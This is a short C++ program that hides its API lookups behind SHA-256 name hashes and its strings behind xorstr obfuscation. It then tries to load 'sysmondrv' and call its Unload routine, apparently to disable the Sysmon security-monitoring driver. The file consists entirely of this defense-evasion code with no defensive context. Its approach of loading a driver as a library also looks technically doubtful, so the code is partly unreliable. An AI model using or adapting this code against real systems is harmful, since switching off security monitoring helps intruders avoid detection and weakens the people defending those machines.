#include <iostream>
#include <xorstr.hpp>

#include "_GetProcAddress.h"

int main()
{
	const PVOID pfnLoadLibrary = _GetProcAddress(nullptr, SHA256String("kernel32.dll"), SHA256String("LoadLibraryA"));
    printf("LoadLibraryA: 0x%p\n", pfnLoadLibrary);

	const HMODULE hModule = reinterpret_cast<HMODULE(__stdcall*)(LPCSTR)>(pfnLoadLibrary)(xorstr_("sysmondrv"));
    printf("sysmondrv: 0x%p\n", hModule);

	const PVOID pfnUnload = _GetProcAddress(hModule, SHA256String("sysmondrv"), SHA256String("Unload"));
    printf("Unload: 0x%p\n", pfnUnload);

    if (pfnUnload)
    {
    	reinterpret_cast<VOID(__stdcall*)()>(pfnUnload)();
		printf("SysmonDrv unloaded\n");
	}
	else 
        printf("SysmonDrv not found\n");

    return 0;
}
